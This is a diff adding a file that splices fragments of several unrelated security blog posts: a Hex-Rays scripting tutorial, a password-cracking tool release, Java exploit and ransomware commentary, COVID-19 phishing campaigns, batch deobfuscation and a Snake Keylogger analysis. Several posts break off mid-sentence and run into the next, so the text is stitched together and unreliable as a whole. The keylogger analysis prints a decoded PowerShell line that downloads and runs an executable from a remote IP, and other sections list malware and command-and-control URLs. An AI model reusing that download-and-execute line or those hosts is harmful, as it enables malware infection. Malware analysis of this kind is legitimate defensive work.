@@ -1,0 +1,406 @@
+Introduction IDA Pro is the de facto standard when it comes to binary reverse engineering.
+Besides being a great disassembler and debugger, it is possible to extend it and include a powerful decompiler by purchasing an additional license from Hex-Rays.
+The ability to switch between disassembled and decompiled code can greatly reduce the analysis time.
+The decompiler (from now on referred to as Hex-Rays ) has been around for a long time and has achieved a good level of maturity.
+However, there seems to be a lack of a concise and complete resources regarding this topic (tutorials or otherwise).
+In this blog, we aim to close that gap by showcasing examples where scripting Hex-Rays goes a long way.
+Overview of a Decompiler In order to understand how the decompiler works, it’s helpful to first review the normal compilation process.
+Compilation and decompilation center around the concept of an Abstract Syntax Tree (AST) .
+In essence, a compiler takes the source code, splits it into tokens according to a grammar, then these tokens are grouped into logical expressions.
+In this phase of the compilation process, referred to as parsing, the code structure is represented as a complex object, the AST.
+From the AST, the compiler will produce assembly code for the specified platform.
+A decompiler takes the opposite route.
+From the given assembly code, it works back to produce an AST, and from this to produce pseudocode.
+From all the intermediate steps between code and assembly, we are stressing the AST so much because most of the time you will spend using the Hex-Rays API, you will actually be reading and/or modifying the Abstract Syntax Tree (or ctree in Hex-Rays terminology).
+Items, Expressions and Statements Now we know that Hex-Rays’s ctree is a tree-like data structure.
+The nodes of this tree are either of type cinsn_t or cexpr_t .
+We will define these in a moment, but for now it is important to know that both derive from a very basic type, namely the citem_t type, as seen in the following code snippet:
+Therefore, all nodes in the ctree will have the op property, which indicates the node type (variable, number, logical expression, etc.).
+The type of op (ctype_t) is an enumeration where all constants are named either cit_<xyz> (for statements) or cot_<xyz> (for expressions).
+Keep this in mind, as it will be very important.
+A quick way to inspect all ctype_t constants and their values is to execute the following code snippet:
+This produces the following output: Let’s dive a bit deeper and explain the two types of nodes: expressions and statements.
+It is useful to think about expressions as the “the little logical elements” of your code.
+They range from simple types such as variables, strings or numerical constants, to small code constructs (assignments, comparisons, additions, logical operations, array indexing, etc.).
+These are of type cexpr_t , a large structure containing several members.
+The members that can be accessed depend on its op value.
+For example, the member n to obtain the numeric value only makes sense when dealing with constants.
+On the other side, we have statements .
+These correlate roughly to language keywords (if, for, do, while, return, etc.)
+Most of them are related to control flow and can be thought as “the big picture elements” of your code.
+Recapitulating, we have seen how the decompiler exposes this tree-like structure (the ctree ), which consists of two types of nodes: expressions and statements.
+In order to extract information from or modify the decompiled code, we have to interact with the ctree nodes via methods dependent on the node type.
+However, the following question arises: “How do we reach the nodes?”
+This is done via a class exposed by Hex-Rays: the tree visitor ( ctree_visitor_t ).
+This class has two virtual methods, visit_insn and visit_expr , that are executed when a statement or expression is found while traversing the ctree.
+We can create our own visitor classes by inheriting from this one and overloading the corresponding methods.
+Example Scripts
+In this section, we will use the Hex-Rays API to solve two real-world problems: Identify calls to GetProcAddress to dynamically resolve Windows APIs, assigning the resulting address to a global variable.
+Display assignments related to stack strings as characters instead of numbers, for easier readability.
+GetProcAddress The first example we will walk through is how to automatically handle renaming global variables that have been dynamically resolved at run time.
+This is a common technique malware uses to hide its capabilities from static analysis tools.
+An example of dynamically resolving global variables using GetProcAddress is shown in Figure 1.
+Figure 1: Dynamic API resolution using GetProcAddress There are several ways to rename the global variables, with the simplest being manual copy and paste.
+However, this task is very repetitive and can be scripted using the Hex-Rays API.
+In order to write any Hex-Rays script, it is important to first visualize the ctree.
+The Hex-Rays SDK includes a sample, sample5, which can be used to view the current function’s ctree.
+The amount of data shown in a ctree for a function can be overwhelming.
+A modified version of the sample was used to produce a picture of a sub-ctree for the function shown in Figure 1.
+The sub-ctree for the single expression: 'dword_1000B2D8 =
+(int)GetProcAdress(v0, \"CreateThread\");' is shown in Figure 2.
+Figure 2:
+Sub-ctree for GetProcAddress assignment With knowledge of the sub-ctree in use, we can write a script to automatically rename all the global variables that are being assigned using this method.
+The code to automatically rename all the local variables is shown in Figure 3.
+The code works by traversing the ctree looking for calls to the GetProcAddress function.
+Once found, the code takes the name of the function being resolved and finds the global variable that is being set.
+The code then uses the IDA MakeName API to rename the address to the correct function.
+Figure 3:
+Function renaming global variables After the script has been executed, we can see in Figure 4 that all the global variables have been renamed to the appropriate function name.
+Figure 4: Global variables renamed Stack Strings
+Our next example is a typical issue when dealing with malware: stack strings .
+This is a technique aimed to make the analysis harder by using arrays of characters instead of strings in the code.
+An example can be seen in Figure 5; the malware stores each character’s ASCII value in the stack and then references it in the call to sprintf .
+At a first glance, it’s very difficult to say what is the meaning of this string (unless of course, you know the ASCII table by heart).
+Figure 5: Hex-Rays decompiler output.
+Stack strings are difficult to read.
+Our script will modify these assignments to something more readable.FireEye's Innovation and Custom Engineering (ICE) team released a tool today called GoCrack that allows red teams to efficiently manage password cracking tasks across multiple GPU servers by providing an easy-to-use, web-based real-time UI (Figure 1 shows the dashboard) to create, view, and manage tasks.
+Simply deploy a GoCrack server along with a worker on every GPU/CPU capable machine and the system will automatically distribute tasks across those GPU/CPU machines.
+Figure 1:
+Dashboard As readers of this blog probably know, password cracking tools are an effective way for security professionals to test password effectiveness, develop improved methods to securely store passwords, and audit current password requirements.
+Some use cases for a password cracking tool can include cracking passwords on exfil archives, auditing password requirements in internal tools, and offensive/defensive operations.
+We’re releasing GoCrack to provide another tool for distributed teams to have in their arsenal for managing password cracking and recovery tasks.
+Keeping in mind the sensitivity of passwords, GoCrack includes an entitlement-based system that prevents users from accessing task data unless they are the original creator or they grant additional users to the task.
+Modifications to a task, viewing of cracked passwords, downloading a task file, and other sensitive actions are logged and available for auditing by administrators.
+Engine files (files used by the cracking engine) such as Dictionaries, Mangling Rules, etc. can be uploaded as “Shared”, which allows other users to use them in task yet do not grant them the ability to download or edit.
+This allows for sensitive dictionaries to be used without enabling their contents to be viewed.
+Figure 2 shows a task list, Figure 3 shows the “Realtime Status” tab for a task, and Figure 4 shows the “Cracked Passwords” tab.
+Figure 2:
+Task Listing Figure 3:
+Task Status Figure 4: Cracked Passwords Tab GoCrack is shipping with support for hashcat v3.6+, requires no external database server (via a flat file), and includes support for both LDAP and database backed authentication.
+In the future, we plan on adding support for MySQL and Postgres database engines for larger deployments, ability to manage and edit files in the UI, automatic task expiration, and greater configuration of the hashcat engine.
+We’re shipping with Dockerfile’s to help jumpstart users with GoCrack.
+The server component can run on any Linux server with Docker installed.
+Users with NVIDIA GPUs can use NVIDIA Docker to run the worker in a container with full access to the GPUs.
+GoCrack is available immediately for download along with its source code on the project's GitHub page .
+If you have any feature requests, questions, or bug reports, please file an issue in GitHub.
+ICE is a small, highly trained, team of engineers that incubate and deliver capabilities that matter to our products, our clients and our customers.
+ICE is always looking for exceptional candidates interested in solving challenging problems quickly.
+If you’re interested, check out FireEye careers .
+Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+Over the last couple of decades, Java has become the lingua franca of software development, a near-universal platform that works across different operating systems and devices.
+With its “write once, run anywhere” mantra, Java has drawn a horde of developers looking to serve a large user base as efficiently as possible.
+Cyber attackers like Java for many of the same reasons.
+With a wide pool of potential targets, the platform has become the vehicle of choice for quickly dispersing lucrative crimeware packages.
+In our continuing mission to equip security professionals against today’s advanced cyber threats, FireEye has published a free report, “ Brewing Up Trouble: Analyzing Four Widely Exploited Java Vulnerabilities .”
+The report outlines four commonly exploited Java vulnerabilities and maps out the step-by-step infection flow of exploits kits that leverage them.
+Download the paper to learn more about these vulnerabilities: CVE-2013-2471 , which allows attackers to override Java’s getNumDataElements() method, leading to memory corruption.
+CVE-2013-2465 ,  which involves insufficient bounds checks in the storeImageArray() function.
+This vulnerability is used by White Lotus and other exploit kits.
+CVE-2012-4681 ,  which allows attackers to bypass security checks using the findMethod () function.
+CVE-2013-2423 , which  arises due to insufficient validation in the findStaticSetter () method, leading to Java type confusion.
+This vulnerability employed by RedKit and other exploits kits.
+As explained in the paper, Java’s popularity among the developers and widespread use in Web browsers all but  guarantees continuing interest from threat actors.
+Motivated by the profits, cyber attackers are bound to adopt more intelligent exploit kits.
+And these attacks will continue to mushroom as more threat actors scramble for a piece of the crimeware pie.
+Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+The term \"critical infrastructure\" has earned its spot on the board of our ongoing game of cyber bingo--right next to \"Digital Pearl Harbor,\" \"Cyber 9/11,\" \"SCADA\" and \"Stuxnet.\" With \"critical infrastructure\" thrown about in references to cyber threats nearly every week, we thought it was time for a closer look at just what the term means-and what it means to other cyber threat actors.
+The term \" critical infrastructure \" conjures up images of highways, electrical grids, pipelines, government facilities and utilities.
+But the U.S. government definition also includes economic security and public health.
+The Department of Homeland Security defines critical infrastructure as \"Systems and assets, whether physical or virtual, so vital to the United States that the incapacity or destruction of such systems and assets would have a debilitating impact on security, national economic security, national public health or safety, or any combination of those matters.\" [1] Certainly the U.S. definition is expansive, but some key cyber actors go a step further to include a more abstract \"information \" asset.
+Russian officials view information content, flow and influencers as an enormous component of critical infrastructure.
+Iran and China similarly privilege the security of their information assets in order to protect their governments.
+The bottom line?
+U.S. companies, who may have never considered themselves a plausible target for cyber threats, could become victims of offensive or defensive state cyber operations.
+Earlier this year several media outlets-including the New York Times and Washington Post-disclosed that they had been the victims of China-based intrusions.
+The Times and the Post linked the intrusions on their networks to their reporting on corruption in the upper echelons of the Chinese Communist Party and other issues.
+These media outlets weren't sitting on plans for a new fighter jet or cutting edge wind turbines-information often assumed to be at risk for data theft.
+Rather, the reporters at the Times and Post were perched in key positions to influence U.S. government and public views of the Chinese leadership, possibly in a negative light.
+The Chinese government had conducted these intrusions against what it deemed critical infrastructure that supported the flow of valuable information.
+Who's up next?
+State actors motivated to target critical infrastructure (by their own definition or the U.S.') won't just be the usual attention grabbers in cyberspace.
+We estimate that Iran, Syria, and North Korea all have interest and would be able to conduct or direct some level of network operations.
+These states are also likely to conduct operations in the near term to identify red lines and gauge corporate and government reactions.
+With little reputational loss at stake, we expect actors sponsored by or associated with these states to target an array of critical infrastructure targets.
+Companies who serve as key information brokers-for the public or the U.S. government-should be particularly attuned to the criticality their work is assigned by a variety of cyber threat actors.
+http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+Given the community interest and media coverage surrounding the economic stimulus bill currently being considered by the United States House of Representatives, we anticipate attackers will increasingly leverage lures tailored to the new stimulus bill and related recovery efforts such as stimulus checks, unemployment compensation and small business loans.
+Although campaigns employing themes relevant to these matters are only beginning to be adopted by threat actors, we expect future campaigns—primarily those perpetrated by financially motivated threat actors—to incorporate these themes in proportion to the media’s coverage of these topics.
+Threat actors with varying motivations are actively exploiting the current pandemic and public fear of the coronavirus and COVID-19.
+This is consistent with our expectations; malicious actors are typically quick to adapt their social engineering lures to exploit major flashpoints along with other recurrent events (e.g. holidays, Olympics).
+Security researchers at FireEye and in the broader community have already begun to identify and report on COVID-19 themed campaigns with grant, payment, or economic recovered themed emails and attachments.
+Example Malware Distribution Campaign On March 18, individuals at corporations across a broad set of industries and geographies received emails with the subject line “COVID-19 Payment” intended to distribute the SILENTNIGHT banking malware (also referred to by others as Zloader).
+Despite the campaign’s broad distribution, a plurality of associated messages were sent to organizations based in Canada.
+Interestingly, although the content of these emails was somewhat generic, they were sometimes customized to reference a payment made in currency relevant to the recipient’s geography and contextually relevant government officials (Figure 1 and Figure 2).
+These emails were sent from a large pool of different @gmx.com email addresses and had password protected Microsoft Word document attachments using the file name “COVID 19 Relief.doc” (Figure 3).
+The emails appear to be auto generated and follow the format <name>.<name><SevenNumberString>@gmx.com.
+When these documents were opened and macros enabled, they would drop and execute a .JSE script crafted to download and execute an instance of SILENTNIGHT from http://209.141.54[.]161/crypt18.dll.
+An analyzed sample of SILENTNIGHT downloaded from this URL had an MD5 hash of 9e616a1757cf1d40689f34d867dd742e, employed the RC4 key 'q23Cud3xsNf3', and was associated with the SILENTNIGHT botnet 'PLSPAM'.
+This botnet has been seen loading configuration files containing primarily U.S.- and Canada financial institution webinject targets.
+Furthermore, this sample was configured to connect to the following controller infrastructure: http://marchadvertisingnetwork4[.]com/post.php http://marchadvertisingnetwork5[.]com/post.php http://marchadvertisingnetwork6[.]com/post.php http://marchadvertisingnetwork7[.]com/post.php http://marchadvertisingnetwork8[.]com/post.php http://marchadvertisingnetwork9[.]com/post.php http://marchadvertisingnetwork10[.]com/post.php Figure 1: Example lure using CAD Figure 2:
+Example lure using AUD Figure 3:
+Malicious Word document Example Phishing Campaign Individuals at financial services organizations in the United States were sent emails with the subject line “Internal Guidance for Businesses Grant and loans in response to respond to COVID-19” (Figure 4).
+These emails had OpenDocument Presentation (.ODP) format attachments that, when opened in Microsoft PowerPoint or OpenOffice Impress, display a U.S. Small Business Administration (SBA) themed message (Figure 5) and an in-line link that redirects to an Office 365 phishing kit (Figure 6) hosted at https://tyuy56df-kind-giraffe-ok.mybluemix[.]net/. Figure 4:
+Email lure referencing business grants and loans Figure 5: SBA-themed message Figure 6: Office 365 phishing page Implications Malicious actors have always exploited users’ sense of urgency, fear, goodwill and mistrust to enhance their operations.
+The threat actors exploiting this crisis are not new, they are simply taking advantage of a particularly overtaxed target set that is urgently seeking new information.
+Users who are aware of this dynamic, and who approach any new information with cautious skepticism will be especially prepared to meet this challenge.
+Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+When Daniel Bohannon released his excellent DOSfuscation paper, I was fascinated to see how tricks I used as a systems engineer could help attackers evade detection.
+I didn’t have much to contribute to this conversation until I had to analyze a hideously obfuscated batch file as part of my job on the FLARE malware queue.
+Previously, I released flare-qdb , which is a command-line and Python-scriptable debugger based on Vivisect.
+I previously wrote about how to use flare-qdb to instrument and modify malware behavior.
+Flare-qdb also made a guest appearance in Austin Baker and Jacob Christie’s SANS DFIR Summit 2017 briefing , inducing the Windows event log service to exclude process creation events.
+In this blog post, I will show how I used flare-qdb to bring “script block logging” to the Windows command interpreter.
+I will also share an Easter Egg that I found by flipping only a single bit in the process address space of cmd.exe.
+Finally, I will share the script that I added to flare-qdb so you can de-obfuscate malicious command scripts yourself by executing them (in a safe environment, of course).
+But first, I’ll talk about the analysis that led me to this solution.
+At First Glance Figure 1 shows a batch script (MD5 hash 6C8129086ECB5CF2874DA7E0C855F2F6) that has been obfuscated using the BatchEncryption tool referenced in Daniel Bohannon’s paper.
+This file does not appear in VirusTotal as of this writing, but its dropper does (the MD5 hash is ABD0A49FDA67547639EEACED7955A01A).
+My goal was to de-obfuscate this script and report on what the attacker was doing.
+Figure 1: Contents of XYNT.bat
+This 165k batch file is dropped as C:\\Windows\\Temp\\XYNT.bat and executed by its dropper.
+Its commands are built from environment variable substrings.
+Figure 2 shows how to use the ECHO command to decode the first command.
+Figure 2: Partial command decoding via the ECHO command The script uses hundreds of commands to set environment variables that are ultimately expanded to de-obfuscate malicious commands.
+A tedious approach to de-obfuscating this script would be to de-fang each command by prepending an ECHO statement to print each de-obfuscated command to the console.
+Unfortunately, although the ECHO command can “decode” each command, BatchEncryption needs the SET commands to be executed to decode future commands.
+To decode this script while allowing the full malicious functionality to run as expected, you would have to iteratively and carefully echo and selectively execute a few hundred obfuscated SET commands.
+The irony of BatchEncryption is that batch scripts are viewed as being easy to de-obfuscate, making binary code the safer place to hide logic from the prying eyes of network defenders.
+But BatchEncryption adds a formidable barrier to analysis by its extensive, layered use of environment variables to rebuild the original commands.
+Taking Cmd of the Situation I decided to see if it would be easier to instrument cmd.exe to log commands rather than de-obfuscating the script myself.
+To begin, I debugged cmd.exe, set a breakpoint on CreateProcessW, and executed a program from the command prompt.
+Figure 3 shows the call stack for CreateProcessW as cmd.exe executes notepad.
+Figure 3:
+Call stack for CreateProcessW in cmd.exe Starting from cmd!ExecPgm, I reviewed the disassembly of the above functions in cmd.exe to trace the origin of the command string up the call stack.
+I discovered cmd!Dispatch, which receives not a string but a structure with pointers to the command, arguments, and any I/O redirection information (such as redirecting the standard output or error streams of a program to a file or device).
+Testing revealed that these strings had all their environment variables expanded, which means we should be able to read the de-obfuscated commands from here.
+Figure 4 is an exploration of this structure in WinDbg after running the command \"echo hai > nul\".
+This command prints the word hai to the standard output stream but uses the right-angle bracket to redirect standard output to the NUL device, which discards all data.
+The orange boxes highlight non-null pointers that got my attention during analysis, and the arrows point to the commands I used to discover their contents.
+Figure 4: Exploring the interesting pointers in 2nd argument to cmd!Dispatch Because users can redirect multiple
+I/O streams in a single command, cmd.exe represents I/O redirection with a linked list.
+For example, the command in Listing 1 shows redirection of standard output (stream #1 is implicit) to shares.txt and standard error (stream #2 is explicitly referenced) to errors.txt.
+net use > shares.txt 2>errors.txt
+Listing 1: Command-line I/O redirection example Figure 5 shows the command data structure and the I/O redirection linked list in block diagram format.
+Figure 5: Command data structure diagram By inspection, I found that cmd!Dispatch is responsible for executing both shell built-ins and executable programs, so unlike breaking on CreateProcess, it will not miss commands that do not result in process creation.
+Based on these findings, I wrote a flare-qdb script to parse and dump commands as they are executed.
+Introducing De-DOSfuscator De-DOSfuscator uses flare-qdb and Vivisect to hook the Dispatch function in cmd.exe and parse commands from memory.
+The De-DOSfuscator script runs in a 64-bit Python 2 interpreter and dumps commands to both the console and a log file.
+The script comes with the latest version of flare-qdb and is installed as a Python entry point named dedosfuscator.exe.
+De-DOSfuscator relies on the location of the non-exported Dispatch function to log commands, and its location varies per system.
+For convenience, if an Internet connection is available, De-DOSfuscator automatically retrieves this function’s offset using Microsoft’s symbol server.
+To allow offline use, you can supply the path to a copy of cmd.exe from your offline machine to the --getoff switch to obtain this offset.
+You can then supply that output as the argument to the --useoff switch in your offline machine to inform De-DOSfuscator where the function is located.
+Alternately, you can use De-DOSfuscator with a downloaded PDB or a local symbol cache containing the correct symbols.Since at least 2017, there has been a significant increase in public disclosures of ransomware incidents impacting industrial production and critical infrastructure organizations.
+Well-known ransomware families like WannaCry, LockerGoga, MegaCortex, Ryuk, Maze, and now SNAKEHOSE (a.k.a.
+Snake / Ekans), have cost victims across a variety of industry verticals many millions of dollars in ransom and collateral costs.
+These incidents have also resulted in significant disruptions and delays to the physical processes that enable organizations to produce and deliver goods and services.
+While lots of information has been shared about the victims and immediate impacts of industrial sector ransomware distribution operations, the public discourse continues to miss the big picture.
+As financial crime actors have evolved their tactics from opportunistic to post-compromise ransomware deployment, we have observed an increase in adversaries’ internal reconnaissance that enables them to target systems that are vital to support the chain of production.
+As a result, ransomware infections—either affecting critical assets in corporate networks or reaching computers in OT networks—often result in the same outcome: insufficient or late supply of end products or services.
+Truly understanding the unique nuances of industrial sector ransomware distribution operations requires a combination of skillsets and visibility across both IT and OT systems.
+Using examples derived from our consulting engagements and threat research, we will explain how the shift to post-compromise ransomware operations is fueling adversaries’ ability to disrupt industrial operations.
+Industrial Sector Ransomware Distribution Poses Increasing Risk as Actors Move to Post-Compromise Deployment
+The traditional approach to ransomware attacks predominantly relies on a “shotgun” methodology that consists of indiscriminate campaigns spreading malware to encrypt files and data from a variety of victims.
+Actors following this model will extort victims for an average of $500 to $1,000 USD and hope to receive payments from as many individuals as possible.
+While early ransomware campaigns adopting this approach were often considered out of scope for OT security, recent campaigns targeting entire industrial and critical infrastructure organizations have moved toward adopting a more operationally complex post-compromise approach.
+In post-compromise ransomware incidents, a threat actor may still often rely on broadly distributed malware to obtain their initial access to a victim environment, but once on a network they will focus on gaining privileged access so they can explore the target networks and identify critical systems before deploying the ransomware.
+This approach also makes it possible for the attacker to disable security processes that would normally be enough to detect known ransomware indicators or behaviors.
+Actors cast wider nets that may impact critical systems, which  expand the scale and effectiveness of their end-stage operations by inflicting maximum pain on the victim.
+As a result, they are better positioned to negotiate and can often demand much higher ransoms—which are commonly commensurate with the victims’ perceived ability to pay and the value of the ransomed assets themselves.
+For more information, including technical detail, on similar activity, see our recent blog posts on FIN6 and TEMP.MixMaster .
+Figure 1: Comparison of indiscriminate vs. post-compromise ransomware approaches Historical incidents involving the opportunistic deployment of ransomware have often been limited to impacting individual computers, which occasionally included OT intermediary systems that were either internet-accessible, poorly segmented, or exposed to infected portable media.
+In 2017, we also observed campaigns such as NotPetya and BadRabbit, where wiper malware with worm-like capabilities were released to disrupt organizations while masquerading as ransomware.
+While these types of campaigns pose a threat to industrial production, the adoption of post-compromise deployment presents three major twists in the plot.
+As threat actors tailor their attacks to target specific industries or organizations, companies with high-availability requirements (e.g., public utilities, hospitals, and industrial manufacturing) and perceived abilities to pay ransoms (e.g., higher revenue companies) become prime targets.
+This represents an expansion of financial crime actors’ targeting of industries that process directly marketable information (e.g., credit card numbers or customer data) to include the monetization of production environments.
+As threat actors perform internal reconnaissance and move laterally across target networks before deploying ransomware, they are now better positioned to cast wide nets that impact the target’s most critical assets and negotiate from a privileged position.
+Most importantly, many of the tactics, techniques, and procedures (TTPs) often used by financial actors in the past, resemble those employed by high-skilled actors across the initial and middle stages of the attack lifecycle of past OT security incidents.
+Therefore, financial crime actors are likely capable of pivoting to and deploying ransomware in OT intermediary systems to further disrupt operations.
+Organized Financial Crime Actors Have Demonstrated an Ability to Disrupt OT Assets
+An actor’s capability to obtain financial benefits from post-compromise ransomware deployment depends on many factors, one of which is the ability to disrupt systems that are the most relevant to the core mission of the victim organizations.
+As a result, we can expect mature actors to gradually broaden their selection from only IT and business processes, to also OT assets monitoring and controlling physical processes.
+This is apparent in ransomware families such as SNAKEHOSE, which was designed to execute its payload only after stopping a series of processes that included some industrial software from vendors such as General Electric and Honeywell.
+At first glance, the SNAKEHOSE kill list appeared to be specifically tailored to OT environments due to the relatively small number of processes (yet high number of OT-related processes) identified with automated tools for initial triage.
+However, after manually extracting the list from the function that was terminating the processes, we determined that the kill list utilized by SNAKEHOSE actually targets over 1,000 processes.
+In fact, we have observed very similar process kill lists deployed alongside samples from other ransomware families, including LockerGoga, MegaCortex, and Maze.FortiGuard Labs Threat Research Report Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Collects sensitive information from victims’ device Severity level :             Critical Fortinet’s FortiGuard Labs recently captured a Microsoft Excel sample from the wild that was used to spread malware .
+After researching its behaviors, I recognized it as a fresh variant of the Snake Keylogger malware.
+Snake Keylogger is a malware developed using .NET.
+It first appeared in late 2020 and focused on stealing sensitive information from a victim’s device, including saved credentials, the victim’s keystrokes, screenshots of the victim’s screen, and clipboard data.
+In July, 2021, Snake Keylogger first entered into a TOP 10 popular malware families report, meaning that the Snake Keylogger family is increasing its influence and impacting more people’s devices and sensitive data.
+In this threat research blog you will learn how the Snake Keylogger variant is downloaded and executed through a captured Excel sample, what techniques this variant uses to protect it from being analyzed, what sensitive information it steals from a victim’s machine, and how it submits that collected data to the attacker.
+Here we go.
+What the Captured Microsoft Excel Sample Looks Like This Excel sample, delivered as an attachment in a phishing email, contains malicious Macro VBA code.
+Figure 1.1 shows a screenshot of when it is opened.
+It displays a vague picture of a document and asks the victim to click the yellow button to get a clearer image.
+Once the yellow button “Enable Content” is clicked by victim, the malicious VBA code is executed in the background.
+The malicious macro project that contains the malicious VBA code is password protected so it cannot be viewed by the analyzer.
+However, we were able to modify its binary file to remove this restriction.
+Going through its code, a “Workbook_Activate()” method is automatically called when the document is opened.
+It writes a piece of PowerShell code from a local variable into a BAT file.
+Figure 1.2 shows partial VBA code of this method, where variable “s” holds the PowerShell code and \"Gqyztfbtsogpnruooqr.bat\" is the BAT file, which is finally executed by calling code “x = Shell(bat, 0)”.
+The bottom of Figure 1.2 shows the content of variable “s”, which contains the base64-encoded PowerShell code that is decoded by PowerShell.exe when it is executed.
+Below is the base64-decoded PowerShell code: $ProcName = \"Wheahmnfpgaqse.exe\"; (New-Object System.
+Net.
+WebClient).
+DownloadFile (\"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe\",\"$env:APPDATA\\$ProcName\"); Start-Process (\"$env:APPDATA\\$ProcName\")
+The PowerShell code is very simple and easy to understand.
+It downloads a file (“Requests07520000652.exe”) onto a victim’s device, places it at “%AppData%\\Wheahmnfpgaqse.exe\" by calling “DownloadFile()”, and executes it by calling “Start-Process()”.
+Snake Keylogger Downloader After some research, I learned that the file \"Wheahmnfpgaqse.exe\" is a downloader of Snake Keylogger, which is a .Net program.
+When it starts, it sleeps 21 seconds to bypass those sandboxes with a strategy of killing a sample process when a timeout of no-action is triggered.
+Twenty one seconds later, the downloader then invokes a function called “Consturctor()”, as you can see in Figure 2.1.
+It then invokes another function “Program.
+List_Types()”, where it downloads Snake Keylogger module from the link “hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll”, which is a RC4 encrypted DLL file.
+Next, it calls “ToRc()” function to RC4 decrypt it using a decryption key \"Dllzjn\".
+It then proceeds to load the decrypted Dll module (a .Net
+Dll file, called “Huzeigtmvaplpinhoo.dll”), and enumerates its export functions to find \"G6doICqoMU()\", which is invoked by executing “type.
+InvokeMember(\\\"G6doICqoMU\\\", BindingFlags.
+InvokeMethod, null, null, null)” in function Consturctor(), as shown in Figure 2.1.
+The decrypted .Net
+Dll is a dropper and installer of Snake Keylogger.
+Let’s dive into this module to see how it performs its tasks.
+Snake Keylogger Installer According to my analysis, the decrypted Dll module (“Huzeigtmvaplpinhoo.dll”) deploys Snake Keylogger onto a victim’s device and sets it as an auto-run program.
+It extracts an executable PE file into memory from the Resource directory and then performs process hollowing that injects the executable PE file into a newly created child process and executes it.
+I will explain in detail how it performs these functions in this section.
+1.
+Persistence Mechanism Figure 3.1 shows an outline of the decrypted Dll module (“Huzeigtmvaplpinhoo.dll”).
+As you can see, to prevent its code from being analyzed the file is obfuscated so that the class names, function names, and variable names are all randomly generated meaningless strings.
+This creates trouble for analysts when analyzing it.
+The full name of the export function “G6doICqoMU()” is “Huzeigtmvaplpinhoo!pXfqpio3clcAoFxTnfJ.CORFgLoyRGlurYwdwIh.
+G6doICqoMU()”.
+Again, for the same reason as before, it sleeps 35 seconds at the beginning of this function to bypass some malware analysis systems.
+Next, it works to make this Snake Keylogger persistent on the infected Windows.
+As we all know, a Windows system has a “Startup” folder inside the “Start Menu”.
+The programs inside this folder are started when Windows starts.
+The full path to this folder is defined in the system registry with a string value of “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell
+Folders\\Startup” and “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup”.
+The value data of “Startup” is C:\\Users\\{UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” by default.
+This variant of Snake Keylogger changes both the values of “Startup” to other folders.
+Figure 3.2 shows the code changing the Windows startup folder to “C:\\Users\\M0YTes0Env\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\chsg\\” by calling the API SetValue().
+In the bottom half of Figure 3.2 you can see the content of the system registry path, value name, and new value data.
+“chsg” is a new folder created by Snake Keylogger.
+The program copies the Snake Keylogger file (the downloaded \"Wheahmnfpgaqse.exe\") into this folder and renames it as “sgosr.exe”.
+This ensures that Snake Keylogger will be started by the Windows system every time it starts.
+2.
+Extraction from Resource Although the content of Huzeigtmvaplpinhoo.dll only appears in memory, to analyze it I saved it into a local file.
+It has several resources in the Resource directory, as shown below in Figure 3.3.
+The process of extracting the payload file of Snake Keylogger is a little complicated.
+It uses a tricky way to load the resource.
+It has a local callback function defined by ResolveEventHandler that is registered to AppDomain.
+ResourceResolve, which is then called when it fails to load a resource by name.
+It looks like an exception handler to Windows SEH strategy to handle exceptions.
+In addition, it has another local callback function registered to AppDomain.
+AssemblyResolve, which is called when it fails to load an assembly (like a module) by name.
+Below is a pseudocode of registering a local resource resolve, where T9wOjU5ccxTJaVfUntn.
+Osc50oil0l is the local callback function.
+AppDomain.
+ResourceResolve += new ResolveEventHandler(T9wOjU5ccxTJaVfUntn.
+Osc50oil0l)
+Now, let’s see how Snake Keylogger solves this challenge—loading a nonexistent resource, which will trigger the resource loading failure.
+It plans to read a Resource named \"Qkxkikeg\" from the current module, which has no such named resource in the Resource directory, as you can see in Figure 3.3.
+A resource loading failure occurs and the registered local ResolveEventHandler function is called to solve this error.
+This then causes a loading assembly failure and its assembly resolve callback function is called.
+A while later, another PE file, decrypted from resource “{d977ee8c-85ce-4731-b9a1-323ba88c6eeb}‎”, appears in memory.
+It contains a resource with the name “Qkxkikeg”, which is the original request resource name, as shown in Figure 3.4.
+The payload of Snake Keylogger is just a compressed in GZIP format in the resource “Qkxkikeg” under the Resource directory “ClassLibrary1.Properties.
+Resources”.
+Figure 3.5 displays the GZIP data of the resource “Qkxkikeg” (reversed) on the left and the decompressed Snake Keylogger on the right side.
+3.
+Process Hollowing The program then creates a suspended child process and deploys the compressed Snake Keylogger payload into the child process.
+It then resumes the child process to run.
+Meanwhile, the parent process exits by calling the function Environment.
+Exit(0).
+According to the code in Figure 3.6, it is about to call API CreateProcess() to create the child process with Creation Flag 134217732U (0x8000004), which means CREATE_NO_WINDOW and CREATE_SUSPENDED.
+It then calls the API WriteProcessMemory() to copy the Snake Keylogger payload into the child process, section by section.
+It next calls SetThreadContext() to make the child process point to the entry point function of Snake Keylogger.
+Before the parent process exits, an API ResumeThread() is called to have the child process restored to run.
+Snake Keylogger Payload
+The code of the Snake Keylogger payload file is fully obfuscated, as shown in Figure 4.1, to protect it from being analyzed.By Ryan Sherstobitoff and Asheer Malhotra on Apr 24, 2018 McAfee Advanced Threat Research analysts have uncovered a global data reconnaissance campaign assaulting a wide number of industries including critical infrastructure, entertainment, finance, health care, and telecommunications.
+This campaign, dubbed Operation GhostSecret, leverages multiple implants, tools, and malware variants associated with the state-sponsored cyber group Hidden Cobra.
+The infrastructure currently remains active.
+In this post, we dive deeply into this campaign.
+For a brief overview of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure, Entertainment, Finance, Health Care, and Other Industries.”
+Our investigation into this campaign reveals that the actor used multiple malware implants, including an unknown implant with capabilities similar to Bankshot.
+From March 18 to 26 we observed the malware operating in multiple areas of the world.
